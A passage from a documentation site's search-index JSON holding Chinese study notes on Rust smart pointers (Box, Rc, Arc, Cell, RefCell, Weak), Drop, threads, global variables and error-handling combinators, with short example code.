<li>\u53ef\u4ee5\u4e3a\u7ed3\u6784\u4f53\u81ea\u5b9a\u4e49 drop     <pre><code>struct A;\nstruct B;\nimpl Drop for A { fn drop(&amp;mut self) { println!(\"drop A\") } }\nimpl Drop for B { fn drop(&amp;mut self) { println!(\"drop B\") } }\nstruct C {\n    a: A,\n    b: B,\n}\nimpl Drop for C { fn drop(&amp;mut self) { println!(\"drop C\") } }\nfn main() {\n    let x = C { a: A, b: B };\n    println!(\"end\");\n}\n// end\n// drop C\n// drop A\n// drop B\n</code></pre><ul> <li>drop \u65b9\u6cd5\u501f\u7528\u76ee\u6807\u4f7f\u7528\u7684\u662f\u53ef\u53d8\u5f15\u7528\uff0c\u4e0d\u4f1a\u62ff\u8d70\u6240\u6709\u6743</li> <li>\u7ed3\u6784\u4f53\u6bcf\u4e2a\u5b57\u6bb5\u90fd\u4f1a drop</li> <li>\u5148\u58f0\u660e\u7684\u53d8\u91cf\u540e drop\u3001\u7ed3\u6784\u4f53\u5185\u90e8\u6309\u987a\u5e8f\u4f9d\u6b21 drop</li> <li>\u5373\u4f7f C \u4e0d\u624b\u52a8\u5b9e\u73b0 Drop\uff0c\u4e5f\u4f1a\u8c03\u7528\u5230 A \u548c B \u7684 drop\uff0c\u56e0\u4e3a\u4f1a\u4e3a C \u63d0\u4f9b\u9ed8\u8ba4\u7684 Drop \u5b9e\u73b0</li> </ul> </li> <li>.drop \u51fd\u6570\u4e0d\u80fd\u624b\u52a8\u8c03\u7528\uff0c\u56e0\u4e3a\u5b83\u662f\u501f\u7528\uff0c\u540e\u9762\u4f9d\u7136\u53ef\u4ee5\u8bbf\u95ee\u539f\u503c\uff0c\u4f46\u662f\u53ef\u80fd\u5df2\u7ecf\u88ab\u6e05\u7406\u4e86<ul> <li>\u4f7f\u7528 std::mem::drop \u51fd\u6570\uff08\u5728 prelude \u4e2d\uff09\u6765\u624b\u52a8 drop</li> <li>std::mem::drop \u7684\u7b7e\u540d\uff1a<code>pub fn drop&lt;T&gt;(_x: T)</code></li> <li>\u8fd9\u4e2a drop \u662f\u4e00\u4e2a\u7a7a\u5b9e\u73b0\uff0c\u5b83\u53ef\u4ee5\u5e26\u8d70\u76ee\u6807\u7684\u6240\u6709\u6743\uff0c\u7136\u540e\u8fd9\u4e2a\u51fd\u6570\u76f4\u63a5\u7ed3\u675f\uff0c\u76ee\u6807\u7684\u4f5c\u7528\u57df\u4e5f\u5c31\u7ed3\u675f\u4e86\uff0c\u5bfc\u81f4\u81ea\u52a8\u8c03\u7528 drop \u65b9\u6cd5\u6765\u91ca\u653e</li> </ul> </li> <li>\u65e0\u6cd5\u4e3a\u540c\u4e00\u4e2a\u7c7b\u578b\u5b9e\u73b0 Copy \u548c Drop</li> </ul>"},{"location":"cs/pl/rust/basic/#box","title":"Box","text":"<ul> <li>Box&lt;T&gt; \u5141\u8bb8\u5c06\u4e00\u4e2a\u503c\u5206\u914d\u5230\u5806\u4e0a\uff0c\u7136\u540e\u5728\u6808\u4e0a\u4fdd\u7559\u4e00\u4e2a\u667a\u80fd\u6307\u9488\u6307\u5411\u5806\u4e0a\u6570\u636e</li> <li>\u53ef\u4ee5\u5c06\u6570\u636e\u5206\u914d\u5230\u5806\u4e0a     <pre><code>let a = Box::new(3);\nprintln!(\"a = {}\", a); // \u5229\u7528 Deref \u81ea\u52a8\u89e3\u5f15\u7528\nlet b = *a + 1; // \u8868\u8fbe\u5f0f\u4e2d\u9700\u8981\u624b\u52a8\u89e3\u5f15\u7528\n</code></pre><ul> <li>\u4f46\u662f Box::new \u4f1a\u5148\u5728\u6808\u4e0a\u5206\u914d\u7a7a\u95f4\u7136\u540e\u79fb\u5230\u5806\u4e0a\uff0c\u6bd4\u5982 Box::new([0; 1000000000000]) \u4f1a\u62a5\u9519\u6808\u6ea2\u51fa</li> </ul> </li> <li>\u907f\u514d\u6808\u4e0a\u6570\u636e\u62f7\u8d1d<ul> <li>\u6808\u4e0a\u6570\u636e\u6240\u6709\u6743\u8f6c\u79fb\u7684\u65f6\u5019\u4f1a\u62f7\u8d1d\u4e00\u4efd\u6570\u636e\uff0c\u4f46\u5728\u5806\u4e0a\u65f6\u5806\u4e0a\u6570\u636e\u4e0d\u4f1a\u62f7\u8d1d\uff0c\u4ec5\u4ec5\u9700\u8981\u62f7\u8d1d\u4e00\u4efd\u6808\u4e0a\u7684\u6307\u9488\u5373\u53ef\u5b8c\u6210\u6240\u6709\u6743\u8f6c\u79fb</li> </ul> </li> <li>\u5c06 DST \u53d8\u4e3a\u56fa\u5b9a\u5927\u5c0f\u7c7b\u578b<ul> <li>\u5982\u9012\u5f52\u7c7b\u578b\uff0crust \u4e0d\u77e5\u9053\u9012\u5f52\u7c7b\u578b\u9700\u8981\u591a\u5c11\u7a7a\u95f4\uff0c\u4f46\u5305\u88f9\u4e00\u5c42 Box \u5219\u53ef\u4ee5\u53d8\u6210\u56fa\u5b9a\u5927\u5c0f     <pre><code>enum List {\n    Cons(i32, Box&lt;List&gt;),\n    Nil,\n}\n</code></pre></li> </ul> </li> <li>\u5c06\u7279\u5f81\u8f6c\u4e3a\u7279\u5f81\u5bf9\u8c61</li> <li>Box::leak<ul> <li>\u6d88\u8d39\u6389 Box\uff0c\u5e76\u5f3a\u5236\u76ee\u6807\u503c\u4ece\u5185\u5b58\u4e2d\u6cc4\u9732</li> <li>\u4f8b\u5982\u5c06 String \u7c7b\u578b\u53d8\u6210\u62e5\u6709 'static \u751f\u547d\u5468\u671f\u7684 &amp;str \u7c7b\u578b     <pre><code>fn func() -&gt; &amp;'static str {\n    let mut s = String::new();\n    s.push_str(\"...\");\n    Box::leak(s.into_boxed_str())\n}\n</code></pre></li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#rc-arc","title":"Rc \u4e0e Arc","text":"<ul> <li>Rc \u5373\u5f15\u7528\u8ba1\u6570\uff08reference counting\uff09\uff0c\u8bb0\u5f55\u4e00\u4e2a\u6570\u636e\u88ab\u5f15\u7528\u7684\u6b21\u6570\u6765\u786e\u5b9a\u6570\u636e\u662f\u5426\u88ab\u4f7f\u7528\uff0c\u5f53\u5f15\u7528\u6b21\u6570\u5f52\u96f6\uff0c\u5219\u6e05\u7406\u91ca\u653e</li> <li>\u4f7f\u7528 clone \u6765\u590d\u5236\u667a\u80fd\u6307\u9488\u5e76\u589e\u52a0\u5f15\u7528\u8ba1\u6570     <pre><code>use std::rc::Rc\nlet a = Rc::new(String::from(\"...\"));\nlet b = Rc::clone(&amp;a);\nassert_eq!(2, Rc::strong_count(&amp;a));\nassert_eq!(2, Rc::strong_count(&amp;b));\n</code></pre><ul> <li>\u4f7f\u7528 Rc::strong_count \u6765\u83b7\u53d6\u8ba1\u6570</li> </ul> </li> <li>Rc \u5728\u79bb\u5f00\u4f5c\u7528\u57df\u65f6\u4f1a\u88ab\u91ca\u653e\uff0c\u5e76\u5c06\u5f15\u7528\u6570\u636e\u7684\u8ba1\u6570\u51cf\u4e00</li> <li>Rc \u662f\u6307\u5411\u5e95\u5c42\u6570\u636e\u7684\u4e0d\u53ef\u53d8\u5f15\u7528\uff0c\u65e0\u6cd5\u901a\u8fc7\u5b83\u6765\u4fee\u6539\u6570\u636e</li> <li>Rc \u53ea\u80fd\u7528\u5728\u540c\u4e00\u7ebf\u7a0b\u5185\u90e8\uff0c\u591a\u7ebf\u7a0b\u4e4b\u95f4\u5171\u4eab\u9700\u8981\u4f7f\u7528 Arc\uff08Atomic Rc\uff09\uff0c\u5176 api \u4e00\u81f4\u4f46\u662f\u7ebf\u7a0b\u5b89\u5168\u7684\uff0c\u4e0d\u8fc7\u6548\u7387\u4f1a\u6709\u6240\u964d\u4f4e<ul> <li>\u9700\u8981 <code>use std::sync::Arc</code></li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#cell-refcell","title":"Cell \u4e0e RefCell","text":"<p>Cell&lt;T&gt; \u9002\u7528\u4e8e T \u5b9e\u73b0 Copy \u7684\u60c5\u51b5\uff0c\u800c\u6ca1\u6709 Copy \u7684\u8bdd\u5219\u4e0d\u80fd\u4f7f\u7528 Cell \u53ea\u80fd\u4f7f\u7528 RefCell\u3002\u4e8c\u8005\u90fd\u53ef\u4ee5\u8fbe\u5230\u5185\u90e8\u53ef\u53d8\u6027\u7684\u6548\u679c</p> <p>Rust \u89c4\u5b9a\u4e00\u4e2a\u7ed3\u6784\u4f53\u4e2d\u7684\u5b57\u6bb5\u8981\u4e48\u90fd\u662f immutable \u8981\u4e48\u90fd\u662f mutable\uff0c\u800c\u4e0d\u80fd\u5c06\u90e8\u5206\u5b57\u6bb5\u6807\u8bb0\u4e3a mutable\u3002\u4f46\u53ef\u4ee5\u4f7f\u7528 Cell \u6216 RefCell \u5305\u88f9\u60f3\u8981\u53ef\u53d8\u7684\u5b57\u6bb5\uff0c\u8fd9\u6837\u5c31\u5b9e\u73b0\u4e86 immutable \u7ed3\u6784\u4f53\u4e2d\u90e8\u5206\u5b57\u6bb5\u53ef\u53d8\u7684\u6548\u679c\u800c\u4e0d\u5fc5\u5c06\u6574\u4e2a\u7ed3\u6784\u4f53\u6807\u8bb0\u4e3a mutable</p>"},{"location":"cs/pl/rust/basic/#cell","title":"Cell","text":"<ul> <li><code>use std::cell::Cell;</code></li> <li>.get() \u53d6\u503c\uff08Copy \u51fa\u6765\uff09</li> <li>\u53ef\u4ee5\u4f7f\u7528 .set() \u8bbe\u7f6e\u65b0\u503c\u800c\u4e0d\u9700\u8981\u5c06\u5176\u6807\u8bb0\u4e3a mut     <pre><code>let c = Cell::new(\"abcd\");\nlet a = c.get();\nc.set(\"efgh\");\nlet b = c.get();\nprintln!(\"{} {}\", a, b); // abcd efgh\n</code></pre></li> <li>\u4f8b\uff1a<ul> <li>\u4e0b\u9762\u4ee3\u7801\u4f1a\u62a5\u9519\uff1a     <pre><code>let mut x = 1;\nlet y = &amp;mut x;\nlet z = &amp;mut x;\nx = 2; *y = 3; *z = 4;\nprintln!(\"{}\", x);\n</code></pre></li> <li>\u800c\u4e0b\u9762\u7684\u4e0d\u4f1a\uff1a     <pre><code>let x = Cell::new(1);\nlet y = &amp;x;\nlet z = &amp;x;\nx.set(2); y.set(3); z.set(4);\nprintln!(\"{}\", x.get());\n</code></pre><ul> <li>\u8fd9\u91cc x \u4e5f\u4e0d\u5fc5\u58f0\u660e\u4e3a mut\uff0cy z \u90fd\u662f x \u7684\u4e0d\u53ef\u53d8\u5f15\u7528\uff0c\u53ef\u4ee5\u5171\u5b58</li> <li>\u4f46\u53ef\u4ee5\u901a\u8fc7 x y z \u6765\u6539\u53d8 cell \u4e2d\u7684\u503c</li> </ul> </li> </ul> </li> <li>Cell \u6ca1\u6709\u6027\u80fd\u635f\u8017</li> <li>Rust 1.37 \u4e2d\u589e\u52a0\u4e86\u4e24\u4e2a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5f88\u597d\u5730\u89e3\u51b3\u501f\u7528\u51b2\u7a81\uff1a<ul> <li>Cell::from_mut\uff0c\u5c06 &amp;mut T \u8f6c\u4e3a &amp;Cell&lt;T&gt;</li> <li>Cell::as_slice_of_cells\uff0c\u5c06 &amp;Cell&lt;[T]&gt; \u8f6c\u4e3a &amp;[Cell&lt;T&gt;]</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#refcell","title":"RefCell","text":"<ul> <li><code>use std::cell::RefCell;</code></li> <li>\u53ef\u4ee5\u4f7f\u7f16\u8bd1\u671f\u53ef\u53d8\u548c\u4e0d\u53ef\u53d8\u5f15\u7528\u5171\u5b58</li> <li>\u4f7f\u7528\u65f6\u53ef\u53d8\u548c\u4e0d\u53ef\u53d8\u5f15\u7528\u4e00\u6837\u4e0d\u80fd\u5171\u5b58\uff0c\u4f1a panic\uff0c\u5e76\u4e0d\u80fd\u4f9d\u6b21\u7ed5\u8fc7\u501f\u7528\u89c4\u5219</li> <li>\u4e0e Cell \u63d0\u4f9b\u503c\u76f8\u6bd4\uff0cRefCell \u63d0\u4f9b\u5f15\u7528<ul> <li>.borrow() \u521b\u5efa\u4e0d\u53ef\u53d8\u5f15\u7528\u3001.borrow_mut() \u521b\u5efa\u53ef\u53d8\u5f15\u7528</li> </ul> </li> <li>RefCell \u9002\u7528\u4e8e\u7f16\u8bd1\u671f\u8bef\u62a5\u6216\u8005\u4e00\u4e2a\u5f15\u7528\u5728\u591a\u5904\u4f7f\u7528\u96be\u4ee5\u7ba1\u7406\u501f\u7528\u5173\u7cfb\u65f6</li> <li>\u53ef\u4ee5\u5229\u7528 RefCell \u6765\u521b\u5efa\u4e00\u4e2a\u4e0d\u662f mut \u4f46\u662f\u5185\u90e8\u503c\u53ef\u53d8\u7684\u4e1c\u897f     <pre><code>use std::cell::RefCell;\npub trait Messenger {\n    fn send(&amp;self, msg: String); // \u5b9a\u4e49\u65f6\u4e0d\u662f &amp;mut self\n}\npub struct MsgQueue {\n    msg_cache: RefCell&lt;Vec&lt;String&gt;&gt;,\n}\nimpl Messenger for MsgQueue {\n    fn send(&amp;self, msg: String) {\n        self.msg_cache.borrow_mut().push(msg) // self \u4e0d\u662f mut \u7684\uff0cmsg_cache \u4e5f\u5c31\u4e0d\u662f mut \u7684\n    }\n}\n</code></pre></li> <li>Rc \u548c RefCell \u7ec4\u5408\u4f7f\u7528\uff0c\u53ef\u4ee5\u540c\u65f6\u62e5\u6709\u591a\u4e2a\u6240\u6709\u8005\u5e76\u5b9e\u73b0\u6570\u636e\u7684\u53ef\u53d8\u6027\uff1a     <pre><code>use std::cell::RefCell;\nuse std::rc::Rc;\nfn main() {\n    let s = Rc::new(RefCell::new(\"...\".to_string()));\n    let s1 = s.clone();\n    let s2 = s.clone();\n    s2.borrow_mut().push_str(\"...\");\n    println!(\"{:?}\\n{:?}\\n{:?}\", s, s1, s2);\n}\n</code></pre><ul> <li>\u4f1a\u8f93\u51fa\u4e09\u904d <code>RefCell { value: \"......\" }</code></li> <li>\u7ec4\u5408\u4f7f\u7528\u6027\u80fd\u5176\u5b9e\u5f88\u9ad8</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#weak","title":"Weak \u5f31\u5f15\u7528","text":"<ul> <li><code>use std::rc::Weak</code></li> <li>\u4f7f\u7528 Rc \u914d\u5408 RefCell \u4f1a\u6784\u9020\u51fa\u4e24\u4e2a\u6307\u9488\u4e92\u76f8\u6307\u4e5f\u5c31\u662f\u5faa\u73af\u5f15\u7528\u7684\u60c5\u51b5\uff0c\u53ef\u80fd\u4f1a\u9020\u6210\u5f15\u7528\u8ba1\u6570\u65e0\u6cd5\u6e05\u96f6\u4e0d\u4f1a drop \u4ece\u800c\u9020\u6210\u5185\u5b58\u6cc4\u6f0f</li> <li>\u4f7f\u7528 Weak \u53ef\u4ee5\u89e3\u51b3\u5faa\u73af\u5f15\u7528\u7684\u95ee\u9898\uff0c\u5b83\u5e76\u4e0d\u4fdd\u8bc1\u5f15\u7528\u5173\u7cfb\u4f1a\u5b58\u5728\uff0c\u4e0e Rc \u76f8\u6bd4\uff0c\u5b83\u7684\u7279\u70b9\uff1a<ul> <li>\u4e0d\u4f1a\u8ba1\u6570</li> <li>\u4e0d\u62e5\u6709\u503c\u7684\u6240\u6709\u6743</li> <li>\u4e0d\u4f1a\u963b\u6b62\u503c\u7684\u91ca\u653e\uff08Rc \u53ea\u6709\u5f53\u8ba1\u6570\u4e3a 0 \u65f6\u624d\u80fd drop\uff09</li> </ul> </li> <li>Weak \u5728\u4f7f\u7528\u65f6\u9700\u8981\u5148\u8c03\u7528 upgrade \u65b9\u6cd5\u5f97\u5230\u4e00\u4e2a Option&lt;Rc&lt;T&gt;&gt; \u7c7b\u578b\u7684\u503c\uff08\u5f53\u5f15\u7528\u503c\u5b58\u5728\u65f6\u8fd4\u56de Some(rc)\uff0c\u53d6\u51fa Rc \u4f7f\u7528\uff0c\u4e0d\u5b58\u5728\u65f6\u8fd4\u56de None\uff09</li> <li>\u5728 Rc&lt;T&gt; \u4e0a\u8c03\u7528 downgrade \u65b9\u6cd5\u5373\u53ef\u83b7\u5f97 Weak&lt;T&gt;\uff0c\u540c\u65f6\u4f1a\u8ba1\u5165\u5230\u8be5 Rc \u7684\u4e00\u4e2a weak_count \u4e0a</li> <li>\u5f53\u4f1a\u9020\u6210\u5faa\u73af\u5f15\u7528\u65f6\uff0c\u5c06\u5176\u4e2d\u4e00\u652f\u6362\u4e3a Weak \u5373\u53ef\u907f\u514d</li> </ul>"},{"location":"cs/pl/rust/basic/#_62","title":"\u591a\u7ebf\u7a0b\u5e76\u53d1\u7f16\u7a0b","text":""},{"location":"cs/pl/rust/basic/#_63","title":"\u4f7f\u7528\u7ebf\u7a0b","text":"<ul> <li>\u521b\u5efa\u7ebf\u7a0b<ul> <li>\u4f7f\u7528 std::thread::spawn \u521b\u5efa\u7ebf\u7a0b</li> <li>\u7ebf\u7a0b\u5185\u90e8\u4ee3\u7801\u4f7f\u7528\u95ed\u5305\u6765\u6267\u884c</li> <li>main \u7ebf\u7a0b\u7ed3\u675f\u5219\u7a0b\u5e8f\u7acb\u5373\u7ed3\u675f\u4e0d\u4f1a\u7b49\u5230\u5b50\u7ebf\u7a0b\u5168\u90e8\u7ed3\u675f</li> <li>thread::sleep \u4f11\u7720\u5f53\u524d\u7ebf\u7a0b\u6307\u5b9a\u65f6\u95f4 <pre><code>use std::thread;\nuse std::time::Duration;\nfn main() {\n    thread::spawn(|| {\n        for i in 1..10 {\n            println!(\"hi number {} from the spawned thread!\", i);\n            thread::sleep(Duration::from_millis(1));\n        }\n    });\n    for i in 1..5 {\n        println!(\"hi number {} from the main thread!\", i);\n        thread::sleep(Duration::from_millis(1));\n    }\n}\n</code></pre></li> </ul> </li> <li>\u7b49\u5f85\u5b50\u7ebf\u7a0b\u7ed3\u675f<ul> <li>spawn \u4f1a\u8fd4\u56de\u4e00\u4e2a JoinHandle&lt;()&gt; \u7c7b\u578b\u7684\u503c\uff0c\u53ef\u4ee5\u5728\u5176\u4e0a\u8c03\u7528 .join \u65b9\u6cd5\u6765\u963b\u585e\u5f53\u524d\u7ebf\u7a0b <pre><code>let handle = thread::spawn(...)\nhandle.join().unwrap();\n</code></pre></li> </ul> </li> <li>\u7ebf\u7a0b\u95ed\u5305\u4e2d\u6355\u83b7\u53d8\u91cf<ul> <li>\u521b\u5efa\u7ebf\u7a0b\u7684\u95ed\u5305\u4e2d\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528\u5f53\u524d\u7ebf\u7a0b\u4e2d\u7684\u53d8\u91cf\uff0c\u56e0\u4e3a\u65e0\u6cd5\u786e\u5b9a\u521b\u5efa\u7684\u65b0\u7ebf\u7a0b\u4f1a\u5b58\u6d3b\u591a\u4e45\uff0c\u53ef\u80fd\u5728\u501f\u7528\u53d8\u91cf\u521b\u5efa\u65b0\u7ebf\u7a0b\uff0c\u5728\u65b0\u7ebf\u7a0b\u8fd0\u884c\u65f6\uff0c\u501f\u7528\u7684\u539f\u503c\u5df2\u7ecf\u88ab drop</li> <li>\u56e0\u6b64\u4f7f\u7528\u6355\u83b7\u53d8\u91cf\u7684\u8bdd\u4e00\u5b9a\u8981\u5728\u53c2\u6570\u5217\u8868\u524d\u52a0\u4e0a move \u5173\u952e\u5b57\u6765\u5f3a\u5236\u8f6c\u79fb\u6240\u6709\u6743\uff08\u4e5f\u5c31\u662f\u8bf4\u5f53\u524d\u7ebf\u7a0b\u540e\u9762\u5c06\u4e0d\u53ef\u4ee5\u5728\u4f7f\u7528\u8fd9\u4e2a\u53d8\u91cf\uff09</li> </ul> </li> <li>barrier<ul> <li>\u5728\u591a\u4e2a\u7ebf\u7a0b\u5185\u540c\u6b65\uff0c\u5373\u7b49\u5f85\u5404\u7ebf\u7a0b\u6267\u884c\u5230\u540c\u4e00\u4f4d\u7f6e\u540e\u518d\u7ee7\u7eed\u6267\u884c</li> <li>\u4f7f\u7528 std::sync::Barrier\uff0c\u9700\u8981\u901a\u8fc7 Arc \u6765\u5206\u914d\u5230\u5404\u4e2a\u7ebf\u7a0b\u4e2d</li> <li>\u8c03\u7528\u5176 .wait() \u65b9\u6cd5\u6765\u5bf9\u6240\u6709\u4f7f\u7528\u4e86 barrier \u5bf9\u7ebf\u7a0b\u8fdb\u884c\u540c\u6b65 <pre><code>use std::sync::{Arc, Barrier};\nuse std::thread;\nfn main() {\n    let mut handles = Vec::with_capacity(6);\n    let barrier = Arc::new(Barrier::new(6));\n    for _ in 0..=5 {\n        let b = barrier.clone();\n        handles.push(thread::spawn(move || {\n            println!(\"before wait\");\n            b.wait();\n            println!(\"after wait\");\n        }))\n    }\n    for handle in handles {\n        handle.join().unwrap();\n    }\n}\n</code></pre></li> </ul> </li> <li>\u7ebf\u7a0b\u5c40\u90e8\u53d8\u91cf<ul> <li>\u6807\u51c6\u5e93 thread_local \u5b8f<ul> <li>\u901a\u8fc7\u5b8f\u6765\u521b\u5efa\u4e00\u4e2a\u751f\u547d\u5468\u671f\u4e3a 'static \u7684\u7ebf\u7a0b\u5c40\u90e8\u53d8\u91cf</li> <li>\u6bcf\u4e2a\u7ebf\u7a0b\u8bbf\u95ee\u65f6\u90fd\u4f1a\u4f7f\u7528\u5b83\u7684\u521d\u59cb\u503c\uff0c\u4e14\u5404\u7ebf\u7a0b\u95f4\u5f7c\u6b64\u4e0d\u5e72\u6270</li> <li>\u7ebf\u7a0b\u5185\u90e8\u4f7f\u7528\u8fd9\u4e2a\u53d8\u91cf\u7684 with \u65b9\u6cd5\u6765\u83b7\u53d6\u503c\u8fdb\u884c\u64cd\u4f5c <pre><code>use std::cell::RefCell;\nuse std::thread;\nthread_local!(static FOO: RefCell&lt;u32&gt; = RefCell::new(1));\nFOO.with(|f| { ... })\nthread::spawn(move || {\n    FOO.with(|f| { ... })\n}).join().unwrap();\n</code></pre></li> </ul> </li> <li>\u7b2c\u4e09\u65b9\u5e93 thread-local</li> </ul> </li> </ul> <p>TODO\uff1a\u6b47\u903c\u4e86\uff0c\u4ee5\u540e\u6709\u65f6\u95f4\u6709\u8010\u5fc3\u4e86\u518d\u770b\u591a\u7ebf\u7a0b</p>"},{"location":"cs/pl/rust/basic/#_64","title":"\u5168\u5c40\u53d8\u91cf","text":"<ul> <li>\u7f16\u8bd1\u671f\u521d\u59cb\u5316<ul> <li>\u9759\u6001\u5e38\u91cf<ul> <li>\u4f7f\u7528 const \u5b9a\u4e49\uff0c\u5fc5\u987b\u6307\u5b9a\u7c7b\u578b\uff0c\u547d\u540d\u4e00\u822c\u5168\u5927\u5199</li> <li>\u53ef\u4ee5\u5728\u4efb\u610f\u4f5c\u7528\u57df\u5b9a\u4e49\uff0c\u751f\u547d\u5468\u671f\u8d2f\u7a7f\u6574\u4e2a\u7a0b\u5e8f</li> <li>\u8d4b\u503c\u53ea\u80fd\u662f\u5728\u7f16\u8bd1\u671f\u5c31\u80fd\u8ba1\u7b97\u7684\u8868\u8fbe\u5f0f</li> <li>\u4e0d\u5141\u8bb8\u51fa\u73b0\u91cd\u590d\u5b9a\u4e49</li> </ul> </li> <li>\u9759\u6001\u53d8\u91cf<ul> <li>\u4f7f\u7528 static \u5b9a\u4e49\uff0c\u5fc5\u987b\u6307\u5b9a\u7c7b\u578b\uff0c\u547d\u540d\u4e00\u822c\u5168\u5927\u5199</li> <li>\u5fc5\u987b\u4f7f\u7528 unsafe \u8bed\u53e5\u5757\u624d\u80fd\u8bbf\u95ee\u548c\u4fee\u6539 static \u53d8\u91cf</li> <li>\u53ea\u6709\u5728\u540c\u4e00\u7ebf\u7a0b\u5185\u6216\u8005\u4e0d\u5728\u4e4e\u591a\u7ebf\u7a0b\u4e2d\u6570\u636e\u51c6\u786e\u6027\u65f6\u624d\u5e94\u8be5\u4f7f\u7528\u5168\u5c40\u9759\u6001\u53d8\u91cf</li> <li>\u8d4b\u503c\u53ea\u80fd\u662f\u5728\u7f16\u8bd1\u671f\u5c31\u80fd\u8ba1\u7b97\u7684\u8868\u8fbe\u5f0f</li> <li>\u9759\u6001\u53d8\u91cf\u4e0d\u4f1a\u88ab\u5185\u8054\uff0c\u4e14\u6574\u4e2a\u7a0b\u5e8f\u4e2d\u53ea\u6709\u4e00\u4e2a\u5b9e\u4f8b</li> <li>\u5b58\u50a8\u5728\u9759\u6001\u53d8\u91cf\u4e2d\u7684\u503c\u9700\u8981\u5b9e\u73b0 Sync trait</li> </ul> </li> <li>\u539f\u5b50\u7c7b\u578b<ul> <li>\u53ef\u4ee5\u4f5c\u4e3a\u5168\u5c40\u8ba1\u6570\u5668\uff0c\u4e14\u662f\u7ebf\u7a0b\u5b89\u5168\u7684 <pre><code>use std::sync::atomic::{AtomicUsize. Ordering};\nstatic VAR: AtomicUsize = AtomicUsize::new(0);\nfn main() {\n    for _ in 0..100 {\n        VAR.fetch_add(1, Ordering::Relaxed);\n    }\n}\n</code></pre></li> </ul> </li> </ul> </li> <li>\u8fd0\u884c\u671f\u521d\u59cb\u5316<ul> <li>\u4f7f\u7528 lazy_static \u5305\u4e2d\u7684 lazy_static \u5b8f</li> <li>\u4f7f\u7528 Box::leak</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#_65","title":"\u9519\u8bef\u5904\u7406","text":"<ul> <li>\u7ec4\u5408\u5668<ul> <li>.or() .and() \u5bf9\u4e24\u4e2a Option / Result \u8fdb\u884c\u7c7b\u4f3c\u5e03\u5c14\u7c7b\u578b\u7684\u64cd\u4f5c\u8fd4\u56de\u5176\u4e2d\u4e00\u4e2a\uff0c\u5982\uff1a     <pre><code>None.or(Some(1)) // -&gt; Some(1)\nOk(\"ok\").and(Err(\"err\")) // -&gt; Err(\"err\")\n</code></pre></li> <li>.or_else() .and_then() \u7b2c\u4e8c\u4e2a\u8868\u8fbe\u5f0f\u662f\u4e00\u4e2a\u8fd4\u56de Option / Result \u7684\u95ed\u5305\uff0c\u5176\u4ed6\u548c or and \u7528\u6cd5\u4e00\u6837</li> <li>.filter() \u53ef\u4ee5\u5bf9 Option \u8fdb\u884c\u8fc7\u6ee4     <pre><code>let s1 = Some(3);\nlet s2 = Some(6);\nlet n = None;\nlet fn_is_even = |x: &amp;i8| x % 2 == 0;\nassert_eq!(s1.filter(fn_is_even), n);  // Some(3) -&gt; 3 is not even -&gt; None\nassert_eq!(s2.filter(fn_is_even), s2); // Some(6) -&gt; 6 is even -&gt; Some(6)\nassert_eq!(n.filter(fn_is_even), n);   // None -&gt; no value -&gt; None\n</code></pre></li> <li>.map() .map_err()<ul> <li>.map() \u6839\u636e\u95ed\u5305\u5c06 Some \u6216 Ok \u4e2d\u7684\u503c\u66f4\u6539\u4e3a\u53e6\u4e00\u4e2a     <pre><code>Some(\"...\").map(|s: &amp;str| s.chars().count()) // -&gt; Some(3)\n</code></pre></li> <li>.map_err() \u540c\u7406\uff0c\u662f\u5c06 Err \u4e2d\u7684\u503c\u66f4\u6539\u4e3a\u53e6\u4e00\u4e2a</li> </ul> </li> <li>.map_or() .map_or_else()<ul> <li>.map_or() \u5305\u542b\u4e24\u4e2a\u53c2\u6570\uff0c\u5f53\u8c03\u7528\u8005\u662f Ok / Some \u65f6\uff0c\u6267\u884c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e2d\u7684\u95ed\u5305\uff0c\u8fd4\u56de\u95ed\u5305\u7684\u8fd4\u56de\u503c\uff1b\u5f53\u8c03\u7528\u8005\u662f Err / None \u65f6\u8fd4\u56de\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f5c\u4e3a\u9ed8\u8ba4\u503c</li> <li>.map_or_else() \u7c7b\u4f3c map_or\uff0c\u4e0d\u8fc7\u7b2c\u4e00\u4e2a\u53c2\u6570\u5373\u9ed8\u8ba4\u503c\u4e5f\u4f7f\u7528\u95ed\u5305\u6765\u63d0\u4f9b</li> </ul> </li> <li>.ok_or() .ok_or_else()<ul> <li>.ok_or() \u5c06 Option \u8f6c\u6362\u4e3a Result     <pre><code>Some(1).ok_or(\"...\") // -&gt; Ok(1)\nNone.ok_or(\"...\") // -&gt; Err(\"...\")\n</code></pre></li> <li>.ok_or_else() \u7c7b\u4f3c\uff0c\u4f46\u53c2\u6570\u7531\u95ed\u5305\u6765\u63d0\u4f9b</li> </ul> </li> </ul> </li> <li>\u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b<ul> <li>std::error::Error trait \u5b9a\u4e49     <pre><code>use std::fmt::{Debug, Display};\npub trait Error: Debug + Display {\n    fn source(&amp;self) -&gt; Option&lt;&amp;(Error + 'static)&gt; { /* \u6709\u9ed8\u8ba4\u5b9e\u73b0 */ }\n}\n</code></pre><ul> <li>\u7531\u6b64\u53ef\u89c1\uff0c\u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b\u53ea\u9700\u8981\u81ea\u52a8 derive Debug\uff0c\u7136\u540e\u624b\u52a8\u5b9e\u73b0\u4e00\u4e0b Display trait</li> </ul> </li> <li>\u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b     <pre><code>use std::fmt;\n#[derive(Debug)]\nstruct MyError;\nimpl fmt::Display for MyError {\n    fn fmt(&amp;self, f: &amp;mut fmt::Formatter) -&gt; fmt::Result {\n        write!(f, \"my error\")\n    }\n}\nfn func() -&gt; Result&lt;(), MyError&gt; {\n    Err(MyError)\n}\n</code></pre></li> <li>\u9519\u8bef\u8f6c\u6362 From trait     <pre><code>#[derive(Debug)]\nstruct MyError {\n    message: String,\n}\nimpl std::fmt::Display for MyError { ... }\nimpl From&lt;io::Error&gt; for MyError {\n    fn from(error: io::Error) -&gt; Self {\n        MyError {\n            message: error.to_string(),\n        }\n    }\n}\n</code></pre><ul> <li>\u8fd9\u6837\u5b9e\u73b0\u4e86\u4e4b\u540e\u5c31\u53ef\u4ee5\u5728 